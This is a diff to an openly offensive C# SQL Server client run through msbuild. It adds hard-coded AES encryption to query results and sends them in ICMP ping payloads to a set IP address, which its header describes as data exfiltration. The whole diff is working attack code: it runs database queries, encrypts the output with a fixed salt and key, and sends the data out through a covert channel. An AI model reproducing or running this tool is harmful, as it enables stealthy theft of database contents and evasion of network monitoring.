@@ -5,6 +5,8 @@
 		Description: This is a simple C# SQL Server client that can be run through msbuild. 
 		By setting the "enableicmp" to true, and setting and IP the results of each query
 		can be included in the payload of the ICMP request for the purpose of data exfiltration.
+		The payloads are encrypted, the salt/key are hard coded.  You can use the baked in decryption
+		function to restore the payload data on the receiving system.
 	    Instructions: 
 		1. 	Save this to a .xml or .csproj file.
 		2. 	In a console, navigate to the folder containing this .csproj or .xml file.
@@ -38,6 +40,7 @@
 		using System.Data;
 		using System.Data.SqlClient;
 		using System.Data.SqlTypes;
+		using System.Security.Cryptography;
 		using System.Net.NetworkInformation;
 		
 		// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.NetworkInformation.dll		
@@ -52,7 +55,137 @@
 		}
 
 		public class SQLCommands
-		{
+		{		
+			// ---------------------------
+			// EncryptStringAES
+			// ---------------------------
+			// Set salt - May not want the salt to be static long term :P
+			private static byte[] _salt = Encoding.Unicode.GetBytes("CaptainSalty");
+			public static string EncryptStringAES(string plainText, string sharedSecret)
+			{
+				if (string.IsNullOrEmpty(plainText))
+					throw new ArgumentNullException("plainText");
+				if (string.IsNullOrEmpty(sharedSecret))
+					throw new ArgumentNullException("sharedSecret");
+
+				string outStr = null;                       // Encrypted string to return
+				RijndaelManaged aesAlg = null;              // RijndaelManaged object used to encrypt the data.
+
+				try
+				{
+					// generate the key from the shared secret and the salt
+					Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);
+
+					// Create a RijndaelManaged object
+					aesAlg = new RijndaelManaged();
+					aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
+					aesAlg.Mode = CipherMode.ECB;
+
+					// Create a decryptor to perform the stream transform.
+					ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
+
+					// Create the streams used for encryption.
+					using (MemoryStream msEncrypt = new MemoryStream())
+					{
+						// prepend the IV
+						msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
+						msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
+						using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+						{
+							using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+							{
+								//Write all data to the stream.
+								swEncrypt.Write(plainText);
+							}
+						}
+						outStr = Convert.ToBase64String(msEncrypt.ToArray());
+					}
+				}
+				finally
+				{
+					// Clear the RijndaelManaged object.
+					if (aesAlg != null)
+						aesAlg.Clear();
+				}
+
+				// Return the encrypted bytes from the memory stream.
+				return outStr;
+			}
+			
+			// ---------------------------
+			// DecryptStringAES
+			// ---------------------------
+			public static string DecryptStringAES(string cipherText, string sharedSecret)
+			{
+				if (string.IsNullOrEmpty(cipherText))
+					throw new ArgumentNullException("cipherText");
+				if (string.IsNullOrEmpty(sharedSecret))
+					throw new ArgumentNullException("sharedSecret");
+
+				// Declare the RijndaelManaged object
+				// used to decrypt the data.
+				RijndaelManaged aesAlg = null;
+
+				// Declare the string used to hold
+				// the decrypted text.
+				string plaintext = null;
+
+				try
+				{
+					// generate the key from the shared secret and the salt
+					Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);
+
+					// Create the streams used for decryption.                
+					byte[] bytes = Convert.FromBase64String(cipherText);
+					using (MemoryStream msDecrypt = new MemoryStream(bytes))
+					{
+						// Create a RijndaelManaged object
+						// with the specified key and IV.
+						aesAlg = new RijndaelManaged();
+						aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
+						aesAlg.Mode = CipherMode.ECB;
+						
+						// Get the initialization vector from the encrypted stream
+						aesAlg.IV = ReadByteArray(msDecrypt);
+						// Create a decrytor to perform the stream transform.
+						ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+						using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+						{
+							using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+
+								// Read the decrypted bytes from the decrypting stream
+								// and place them in a string.
+								plaintext = srDecrypt.ReadToEnd();
+						}
+					}
+				}
+				finally
+				{
+					// Clear the RijndaelManaged object.
+					if (aesAlg != null)
+						aesAlg.Clear();
+				}
+
+				return plaintext;
+			}
+
+			private static byte[] ReadByteArray(Stream s)
+			{
+				byte[] rawLength = new byte[sizeof(int)];
+				if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
+				{
+					throw new SystemException("Stream did not contain properly formatted byte array");
+				}
+
+				byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
+				if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
+				{
+					throw new SystemException("Did not read byte array properly");
+				}
+
+				return buffer;
+			}		    			
+			
 			public static string RunQuery(string MyConnString, string filePath)
 			{											
 				// Read line from the client
@@ -150,7 +283,7 @@
 					// Set connection string						
 					if(connString.Equals(""))
 					{
-						connString = @"Server=SQLServer\INSTANCE;Database=Master;Integrated Security=SSPI;";						
+						connString = @"Server=SQLServer\INSTANCE;Database=Master;Integrated Security=SSPI;";												
 					}
 
 					// Create new connection
@@ -215,11 +348,14 @@
 							System.IO.File.WriteAllText(filePath, fileContent.ToString());
 							Console.WriteLine("\nSuccessfully wrote query output to " + filePath);
 
+								// encrypt payload
+								string encrypted64 = EncryptStringAES(fileContent.ToString(),"changethis");
+							
 								// send results in icmp
-                						// https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
-								string enableicmp = "";
+								string enableicmp = "false";
 								if(enableicmp == "true")
-								{									
+								{
+									// https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
 									string ipaddress = "192.168.1.1";
 									Ping pingSender = new Ping ();
 									PingOptions options = new PingOptions ();
@@ -229,7 +365,7 @@
 									options.DontFragment = true;
 
 									// Create a buffer of 32 bytes of data to be transmitted.
-									string data = fileContent.ToString();
+									string data = encrypted64;
 									byte[] buffer = Encoding.ASCII.GetBytes (data);
 									int timeout = 120;
 									PingReply reply = pingSender.Send (ipaddress, timeout, buffer, options);
